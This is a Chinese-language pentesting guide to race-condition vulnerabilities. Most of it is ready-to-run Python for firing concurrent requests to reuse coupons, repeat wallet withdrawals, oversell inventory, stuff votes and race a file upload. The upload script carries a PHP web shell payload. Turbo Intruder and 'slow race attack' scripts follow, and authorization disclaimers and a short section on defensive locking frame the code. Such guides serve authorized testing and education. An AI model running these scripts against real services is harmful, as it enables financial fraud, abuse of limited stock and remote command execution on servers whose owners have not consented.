# 条件竞争漏洞（Race Condition）

> **合规声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得明确书面授权后进行任何安全测试活动。

---

## 目录

1. [原理说明](#1-原理说明)
2. [常见场景](#2-常见场景)
3. [检测方法](#3-检测方法)
4. [Python 测试示例](#4-python-测试示例)
5. [实战 Tip](#5-实战-tip)

---

## 1. 原理说明

### 什么是条件竞争？

条件竞争（Race Condition）发生在多个线程/进程并发访问共享资源且至少一个访问是写操作时，由于缺乏同步机制导致程序行为与预期不符。

### 时序图

```
正常流程：
  请求1 ──→ 检查余额(100) ──→ 扣除(100) ──→ 成功(余额0)
  请求2                                                  ──→ 检查余额(0) ──→ 失败

竞争条件：
  请求1 ──→ 检查余额(100) ──→ 扣除(100) ──→ 成功(余额0)
  请求2 ──→ 检查余额(100) ──→ 扣除(100) ──→ 成功(余额-100)

                          ↑
              两个请求同时通过了余额检查！
```

### 常见成因

- **非原子操作**: 检查+操作没有放在同一个事务中
- **缺少锁机制**: 数据库行锁未使用，或应用层未加锁
- **异步处理**: 异步任务队列中的先后顺序问题
- **TOCTOU**: Time-of-check Time-of-use（先检查后使用的时间窗）

---

## 2. 常见场景

### 2.1 优惠券重复使用

```python
"""
漏洞流程：
1. 用户领到一张 100 元优惠券（coupon_id=ABC）
2. 正常情况下：使用后 coupon.state = used
3. 竞争条件：同时发送多个使用请求，全部在 state 变为 used 之前通过了检查
"""
import requests

url = "https://target.com/api/order/apply-coupon"
token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

# 用 Python threading 模拟并发申请
import threading

results = []

def apply_coupon():
    r = requests.post(url, json={"coupon_code": "WELCOME100", "order_id": 123},
                      headers=headers)
    results.append(r.status_code)
    if r.status_code == 200:
        print(f"[+] Coupon applied! Response: {r.text[:100]}")

threads = []
for i in range(50):
    t = threading.Thread(target=apply_coupon)
    threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()

success_count = results.count(200)
print(f"Successfully applied: {success_count}/50")
if success_count > 1:
    print("[!] Race condition: coupon used multiple times!")
```

### 2.2 余额多次提现

```python
import requests
import threading

url = "https://target.com/api/wallet/withdraw"
token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

results = []

def withdraw():
    r = requests.post(url, json={"amount": 100, "bank_account": "123456"},
                      headers=headers)
    results.append((r.status_code, r.text[:100]))
    if r.status_code == 200:
        print(f"[+] Withdraw success: {r.text[:80]}")

# 并发提现
threads = []
for i in range(20):
    t = threading.Thread(target=withdraw)
    threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()

success_count = sum(1 for status, _ in results if status == 200)
if success_count > 1 and success_count <= 5:
    print(f"[!] Possible race: {success_count} successful withdrawals from one balance")
elif success_count > 5:
    print(f"[!!!] Strong race condition: {success_count} withdrawals succeeded!")
```

### 2.3 库存超卖

```python
import requests
import concurrent.futures

url = "https://target.com/api/cart/checkout"
token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

results = []
lock = threading.Lock()

def purchase():
    r = requests.post(url, json={"product_id": "LIMITED_ITEM", "quantity": 1},
                      headers=headers)
    with lock:
        results.append(r.status_code)

# 并发购买 100 次
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(purchase) for _ in range(100)]
    concurrent.futures.wait(futures)

success_count = results.count(200)
print(f"Successful purchases: {success_count}/100")
if success_count > 10:  # 假设库存只有 10 件
    print(f"[!] Inventory oversold! Should be max 10, got {success_count}")
```

### 2.4 点赞/投票刷票

```python
import requests
import concurrent.futures

url = "https://target.com/api/post/like"
token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}"}

# 通过不同的参数（多个 IP 或 account）并发刷赞
def like_post(post_id, user_id):
    r = requests.post(url, json={"post_id": post_id}, headers={
        "Authorization": f"Bearer TOKEN_FOR_USER_{user_id}"
    })
    return r.status_code

# 并发 50 个账号同时点赞
post_id = 12345
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(
        lambda uid: like_post(post_id, uid),
        range(50)
    ))

# 检查总点赞数是否超过 50（说明重复点赞）
print(f"Total like responses: {len(results)}")
```

### 2.5 文件时间窗竞争

```python
"""
场景：头像/文件上传 → 大小检查 → 移动到公开目录

时间窗：
1. 文件上传临时存储
2. 服务器检查文件类型（仅检查扩展名/头信息）
3. 如果通过，移动到公开目录

竞争利用：
在检查通过后、移动完成前，替换文件内容为恶意代码
"""
import requests
import threading
import time

upload_url = "https://target.com/api/upload/avatar"
token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}"}

# 构造合法图片 + 恶意代码
# 制作 polyglot 文件（合法图片 + PHP 代码）

def upload_clean():
    """上传合法文件"""
    files = {"file": ("avatar.jpg", b"GIF89a\\x01\\x00\\x01\\x00...", "image/jpeg")}
    r = requests.post(upload_url, files=files, headers=headers)
    return r.text

def upload_malicious():
    """上传恶意文件"""
    malicious_content = b"GIF89a\\x01\\x00\\x01\\x00... <?php system($_GET['cmd']); ?>"
    files = {"file": ("avatar.php.gif", malicious_content, "image/gif")}
    r = requests.post(upload_url, files=files, headers=headers)
    return r.text

# 并发发送合法和恶意文件
def race_upload():
    upload_clean()
    upload_malicious()

# 同时触发多个上传
threads = []
for i in range(20):
    t = threading.Thread(target=race_upload)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

---

## 3. 检测方法

### 3.1 并发请求工具对比

| 工具 | 优势 | 劣势 | 适用场景 |
|------|------|------|----------|
| **Turbo Intruder** | Burp 集成，支持定时请求 | 需要 Burp 专业版 | 精细控制的 HTTP 并发 |
| **Python threading** | 灵活，可编程 | 全局解释器锁（GIL）限制线程 | 通用并发测试 |
| **Python asyncio + aiohttp** | 真正的异步，高并发 | 学习曲线略高 | 大量请求的并发测试 |
| **curl + parallel** | 简单快捷 | 控制不够精细 | 快速验证 |
| **HTTPie + parallel** | 可读性好 | 大量请求性能差 | 原型测试 |

### 3.2 时间窗分析

```python
"""
时间窗分析 — 了解请求处理的时间跨度
"""
import time
import requests
import statistics

def measure_request_time(url: str, method: str = "POST", **kwargs):
    """测量单个请求的处理时间"""
    start = time.perf_counter()
    if method == "POST":
        r = requests.post(url, **kwargs)
    else:
        r = requests.get(url, **kwargs)
    elapsed = time.perf_counter() - start
    return elapsed, r.status_code

# 多次测量获取平均处理时间
sample_times = []
for i in range(10):
    elapsed, status = measure_request_time(
        "https://target.com/api/order/apply-coupon",
        json={"coupon_code": "TEST", "order_id": 123},
        headers={"Authorization": "Bearer TOKEN"}
    )
    sample_times.append(elapsed)
    time.sleep(0.1)

avg_time = statistics.mean(sample_times)
max_time = max(sample_times)
min_time = min(sample_times)
std_dev = statistics.stdev(sample_times)

print(f"Avg: {avg_time:.4f}s, Min: {min_time:.4f}s, Max: {max_time:.4f}s")
print(f"Std Dev: {std_dev:.4f}s")

# 如果处理时间变化较大 → 时间窗可能较大 → 更容易利用
if std_dev > 0.1:
    print("[+] Wide time window detected - easier to exploit")
```

### 3.3 自动化检测脚本结构

```python
#!/usr/bin/env python3
"""
Race Condition Scanner
"""

import requests
import threading
import time
import concurrent.futures
from typing import List, Dict, Callable
from dataclasses import dataclass


@dataclass
class RaceResult:
    endpoint: str
    success_count: int
    total_requests: int
    vulnerable: bool
    details: List[str]


class RaceConditionScanner:
    """条件竞争扫描器"""

    def __init__(self, base_url: str, token: str):
        self.base_url = base_url.rstrip("/")
        self.session_headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "Content-Type": "application/json",
        }

    def _make_request(self, endpoint: str, method: str = "POST",
                      json_data: dict = None) -> int:
        """发送单个请求"""
        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        try:
            if method == "POST":
                r = requests.post(url, json=json_data, headers=self.session_headers,
                                  timeout=10)
            else:
                r = requests.get(url, headers=self.session_headers, timeout=10)
            return r.status_code
        except:
            return 0

    def test_concurrent_requests(self, endpoint: str, json_data: dict,
                                 concurrency: int = 50,
                                 method: str = "POST",
                                 baseline_status: int = 200) -> RaceResult:
        """
        并发请求测试：
        发送 N 个并发请求，统计成功数
        如果成功数 > 预期（通常是 1），则存在竞争条件
        """
        results = []
        lock = threading.Lock()

        def worker():
            status = self._make_request(endpoint, method, json_data)
            with lock:
                results.append(status)

        # 启动并发线程
        threads = []
        for i in range(concurrency):
            t = threading.Thread(target=worker)
            threads.append(t)

        start_time = time.time()
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        elapsed = time.time() - start_time

        success_count = results.count(baseline_status)
        vulnerable = success_count > 1

        details = [
            f"Concurrency: {concurrency}",
            f"Time window: {elapsed:.2f}s",
            f"Baseline status: {baseline_status}",
        ]

        result = RaceResult(
            endpoint=endpoint,
            success_count=success_count,
            total_requests=concurrency,
            vulnerable=vulnerable,
            details=details,
        )

        if vulnerable:
            print(f"[!] RACE: {endpoint} - {success_count}/{concurrency} succeeded")
        else:
            print(f"[ ] OK: {endpoint} - {success_count}/{concurrency} succeeded")

        return result

    def scan_endpoints(self, endpoints: List[Dict]) -> List[RaceResult]:
        """扫描多个端点"""
        all_results = []
        for ep in endpoints:
            result = self.test_concurrent_requests(
                endpoint=ep["endpoint"],
                json_data=ep.get("json_data", {}),
                concurrency=ep.get("concurrency", 50),
                method=ep.get("method", "POST"),
            )
            all_results.append(result)
        return all_results


# 使用
if __name__ == "__main__":
    scanner = RaceConditionScanner(
        base_url="https://target.com/api",
        token="USER_TOKEN"
    )

    endpoints = [
        {"endpoint": "order/apply-coupon",
         "json_data": {"coupon_code": "WELCOME100", "order_id": 123},
         "concurrency": 50},
        {"endpoint": "wallet/withdraw",
         "json_data": {"amount": 100, "bank_account": "123456"},
         "concurrency": 30},
        {"endpoint": "post/like",
         "json_data": {"post_id": 12345},
         "concurrency": 100},
    ]

    results = scanner.scan_endpoints(endpoints)
    vulnerable = [r for r in results if r.vulnerable]
    print(f"\nFound {len(vulnerable)} vulnerable endpoints")
```

---

## 4. Python 测试示例

### 4.1 基础并发测试（threading）

```python
import requests
import threading
import time

# 目标配置
TARGET = "https://target.com/api/coupon/redeem"
TOKEN = "YOUR_TOKEN"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json",
}
DATA = {"coupon": "RACE_100", "order_id": 456}

# 线程安全的计数器
class SafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

success_counter = SafeCounter()
error_counter = SafeCounter()
responses = []

def race_request():
    try:
        r = requests.post(TARGET, json=DATA, headers=HEADERS, timeout=10)
        if r.status_code == 200:
            n = success_counter.increment()
            print(f"[+] Success #{n}: {r.text[:50]}")
        else:
            n = error_counter.increment()
            print(f"[-] Failed #{n}: {r.status_code}")
        responses.append(r.status_code)
    except Exception as e:
        print(f"[!] Error: {e}")

# 创建 50 个线程同时发送
print("[*] Starting race condition test...")
threads = []
for i in range(50):
    t = threading.Thread(target=race_request)
    threads.append(t)

# 同时启动能增加竞争概率
# 使用 barrier 让所有线程在同一时刻发出请求
def race_synchronized():
    barrier.wait()  # 所有线程在此等待
    race_request()

barrier = threading.Barrier(50)
threads = []
for i in range(50):
    t = threading.Thread(target=race_synchronized)
    threads.append(t)

start = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
elapsed = time.time() - start

print(f"\n[*] Results: {success_counter.value} success, {error_counter.value} failed")
print(f"[*] Time: {elapsed:.2f}s")
if success_counter.value > 1:
    print("[!!!] RACE CONDITION DETECTED!")
```

### 4.2 高并发测试（asyncio + aiohttp）

```python
import asyncio
import aiohttp
import time

async def race_attack(session, url, json_data, headers):
    """单个异步请求"""
    try:
        async with session.post(url, json=json_data, headers=headers) as resp:
            status = resp.status
            text = await resp.text()
            return status, text[:100]
    except Exception as e:
        return 0, str(e)

async def run_race(target, data, headers, concurrency=200):
    """高并发条件竞争测试"""
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(concurrency):
            task = race_attack(session, target, data, headers)
            tasks.append(task)

        # 并发执行所有请求
        start = time.time()
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - start

        success_count = sum(1 for status, text in results if status == 200)
        print(f"[*] Requests: {len(results)}")
        print(f"[*] Success: {success_count}")
        print(f"[*] Time: {elapsed:.2f}s")

        if success_count > 1:
            print(f"[!!!] Race condition! Expected max 1 success, got {success_count}")
            # 打印成功的响应
            for status, text in results:
                if status == 200:
                    print(f"    {text}")
        else:
            print("[ ] No race condition detected")

        return results

# 使用
async def main():
    await run_race(
        target="https://target.com/api/wallet/withdraw",
        data={"amount": 1000},
        headers={
            "Authorization": "Bearer TOKEN",
            "Content-Type": "application/json",
        },
        concurrency=200
    )

# asyncio.run(main())
```

### 4.3 带前置操作的竞争测试

一种高级竞争利用方式：在资源释放后立即执行操作。

```python
import requests
import threading
import time

"""
场景：取消订单 → 释放库存 → 立即重新购买

时间窗分析：
1. 用户 A 下单购买限量商品
2. 用户 A 取消订单（库存 +1）
3. 用户 B 和 C 同时购买（在原订单释放的瞬间）
"""

cancel_url = "https://target.com/api/order/cancel"
purchase_url = "https://target.com/api/cart/checkout"
token_a = "USER_A_TOKEN"
token_b = "USER_B_TOKEN"

order_id = 789  # 用户 A 的订单

cancel_event = threading.Event()
results = []

def cancel_order():
    """用户 A 取消订单（释放资源）"""
    headers = {"Authorization": f"Bearer {token_a}"}
    r = requests.post(cancel_url, json={"order_id": order_id}, headers=headers)
    print(f"[*] Cancel: {r.status_code}")
    cancel_event.set()  # 通知其他线程

def purchase_after_cancel(user_token, user_name):
    """在取消后立即购买"""
    cancel_event.wait()  # 等待取消完成
    # 在取消返回的瞬间抢购
    headers = {"Authorization": f"Bearer {user_token}"}
    r = requests.post(purchase_url, json={"product_id": "LIMITED", "quantity": 1},
                      headers=headers)
    results.append((user_name, r.status_code))
    if r.status_code == 200:
        print(f"[+] {user_name} purchased successfully!")

# 同时启动取消和多个购买线程
threads = []
threads.append(threading.Thread(target=cancel_order))
threads.append(threading.Thread(target=purchase_after_cancel, args=(token_b, "User B")))
threads.append(threading.Thread(target=purchase_after_cancel,
                                args=("USER_C_TOKEN", "User C")))

for t in threads:
    t.start()
for t in threads:
    t.join()

for name, status in results:
    print(f"  {name}: {status}")
# 如果两个用户都成功购买 → 库存释放竞争条件
```

### 4.4 多阶段竞争测试

```python
"""
多阶段竞争：一个操作由多个 API 调用组成

场景：兑换礼品卡
阶段1: POST /api/giftcard/redeem  — 兑换（检查余额）
阶段2: POST /api/giftcard/confirm — 确认兑换（扣减金额）
"""

import requests
import threading
import time

token = "USER_TOKEN"
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
base = "https://target.com/api"

results = []

def multi_stage_race():
    """多阶段竞争测试：在阶段1和阶段2之间插入并发请求"""
    # 阶段1：检查
    r1 = requests.post(f"{base}/giftcard/redeem",
                       json={"code": "GC-100-ABCD"},
                       headers=headers)
    if r1.status_code == 200:
        trans_id = r1.json().get("transaction_id")
        # 阶段2：确认（并发多次）
        def confirm():
            for i in range(5):
                r = requests.post(f"{base}/giftcard/confirm",
                                  json={"transaction_id": trans_id},
                                  headers=headers)
                results.append((i, r.status_code))

        # 创建多个确认线程
        threads = [threading.Thread(target=confirm) for _ in range(3)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

# 执行
multi_stage_race()
success_count = sum(1 for _, status in results if status == 200)
print(f"Successful confirms: {success_count}")
if success_count > 1:
    print("[!] Multi-stage race condition!")
```

---

## 5. 实战 Tip

### 5.1 提高竞争概率的技巧

```python
# 1. 使用 Barrier 同步所有线程
barrier = threading.Barrier(50)
def synced_request():
    barrier.wait()  # 所有线程准备就绪才同时发出
    requests.post(...)

# 2. 多个请求在网络层面合并（HTTP pipelining）
# 某些服务器/代理会同时处理管道请求
import http.client
conn = http.client.HTTPConnection("target.com")
conn.connect()
# 同时发送多个请求不等待响应
for i in range(10):
    conn.request("POST", "/api/coupon/redeem", body=..., headers=...)

# 3. 重启网络接口（在某些本地测试中）
# sudo ip link set eth0 down && sudo ip link set eth0 up

# 4. 利用网络延迟
# 在性能差的服务器上时间窗更大，竞争更容易成功

# 5. 使用 tcpdump 分析请求间隔
# tcpdump -i eth0 host target.com -w race.pcap
```

### 5.2 Turbo Intruder 配置

```python
"""
Burp Suite Turbo Intruder 脚本示例
"""
# 在 Turbo Intruder 中使用的 Python 脚本
"""
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,  # 并发连接数
        requestsPerConnection=10,  # 每连接请求数
        pipeline=True,             # 启用 HTTP pipelining
        maxRetriesPerRequest=0,
    )

    # 构造重复的请求
    request = """
POST /api/coupon/redeem HTTP/1.1
Host: target.com
Authorization: Bearer TOKEN
Content-Type: application/json
Content-Length: 40

{"coupon":"RACE100","order_id":123}
"""
    # 同时发送 50 个请求
    for i in range(50):
        engine.queue(request)

    # 等待所有请求完成
    engine.start(timeout=10)

def handleResponse(req, interesting):
    table.add(req)
"""
```

### 5.3 常见防御模式识别

```python
# 后端常见的锁机制
# 1. 数据库行锁
#    SELECT quantity FROM products WHERE id=1 FOR UPDATE
#    UPDATE products SET quantity=quantity-1 WHERE id=1 AND quantity>0

# 2. Redis 分布式锁
#    SET lock_key UUID NX EX 10
#    DO work
#    DEL lock_key

# 3. 乐观锁（版本号）
#    UPDATE products SET quantity=quantity-1, version=version+1
#    WHERE id=1 AND quantity>0 AND version=OLD_VERSION

# 4. 队列化处理
#    所有请求进入队列，单线程处理

# 检测后端是否有锁机制
def detect_lock_mechanism(url: str, token: str):
    """检测后端是否有并发控制"""
    import time

    headers = {"Authorization": f"Bearer {token}"}

    # 测量串行处理时间
    serial_times = []
    for i in range(5):
        start = time.time()
        r = requests.post(url, json={"amount": 1}, headers=headers)
        serial_times.append(time.time() - start)

    # 测量并行处理时间
    import threading
    parallel_times = []
    lock = threading.Lock()

    def measure():
        start = time.time()
        r = requests.post(url, json={"amount": 1}, headers=headers)
        with lock:
            parallel_times.append(time.time() - start)

    threads = [threading.Thread(target=measure) for _ in range(5)]
    for t in threads: t.start()
    for t in threads: t.join()

    # 如果并发处理总时间 ≈ 串行处理总时间 → 有队列/锁
    serial_total = sum(serial_times)
    parallel_total = max(parallel_times)

    if parallel_total > serial_total * 0.8:
        print("[*] Lock mechanism likely present (serialized processing)")
    else:
        print("[?] No strong lock detected (parallel processing possible)")
```

### 5.4 场景发现 Checklist

```
在以下功能中重点寻找竞争条件：

[ ] 优惠券/折扣码兑换
[ ] 积分/金币兑换
[ ] 提现/转账
[ ] 库存/限量商品购买
[ ] 点赞/投票/评分
[ ] 签到/每日奖励
[ ] 邀请奖励
[ ] 文件上传（TOCTOU）
[ ] 密码修改/邮箱修改（验证码验证+修改分离）
[ ] 注册/创建资源（用户名/邮箱唯一性检查+写入分离）
[ ] 兑换码/礼品卡
[ ] 订阅/取消订阅
[ ] 退款申请
[ ] 下架/重新上架商品
[ ] 权限提升流程（多步审批）
```

### 5.5 成功率提升策略

```python
"""
策略1：网络延迟法
在弱网环境下，请求处理时间更长，时间窗更大

策略2：大 payload 法
请求体越大，序列化/反序列化时间越长，时间窗越大

策略3：慢速请求法（Slow HTTP）
发送缓慢的 HTTP 请求，延长读写时间窗

策略4：并发 + 重试
"""
import requests
import threading
import time

def slow_race_attack(url: str, data: dict, headers: dict,
                     concurrency: int = 100, retries: int = 3):
    """
    慢速竞争攻击：
    1. 发送大 payload 增加处理时间
    2. 多次重试增加成功概率
    """

    # 1. 增加 payload 大小
    large_data = {**data, "comment": "A" * 100000}  # 100KB 额外数据

    for attempt in range(retries):
        print(f"\n[*] Attempt {attempt + 1}/{retries}")

        results = []
        lock = threading.Lock()

        def race():
            r = requests.post(url, json=large_data, headers=headers, timeout=30)
            with lock:
                results.append(r.status_code)

        # 使用 Semaphore 控制线程启动时机
        # 先创建所有线程再释放
        sem = threading.Semaphore(0)
        threads = []
        for i in range(concurrency):
            t = threading.Thread(target=race)
            threads.append(t)
            t.start()

        # 等待所有线程完成
        for t in threads:
            t.join()

        success = results.count(200)
        print(f"  Success: {success}/{concurrency}")
        if success > 1:
            print(f"[!!!] Race condition confirmed!")
            return True

        # 下次尝试调整策略
        time.sleep(1)

    return False
```

### 5.6 自动化工具推荐

```bash
# 1. Turbo Intruder (Burp Suite 插件)
# 安装: BApp Store -> Turbo Intruder

# 2. Race The Web (Burp Suite 插件)
# 安装: BApp Store -> Race The Web
# 专门用于条件竞争测试

# 3. Caido (替代 Burp 的工具)
# 内置条件竞争测试功能

# 4. Custom Python Script (推荐)
# 结合 asyncio + aiohttp 实现高并发
```

---

## 检查清单

- [ ] 优惠券/折扣码一次性验证是否存在竞争
- [ ] 余额提现/转账是否存在重复扣减
- [ ] 限量商品是否存在超卖
- [ ] 投票/点赞是否存在刷票
- [ ] 文件上传是否存在 TOCTOU
- [ ] 多步操作（检查+执行）之间是否存在时间窗
- [ ] 异步任务处理是否存在竞争
- [ ] 并发请求是否绕过了唯一性约束
- [ ] 库存/配额是否存在负数（重复扣减）
- [ ] 积分/奖励系统是否存在刷分

> **提醒**: 所有条件竞争测试需在授权范围内进行。成功的竞争攻击可能会造成数据损坏或资金损失，发现漏洞后应立即停止批量利用并报告。
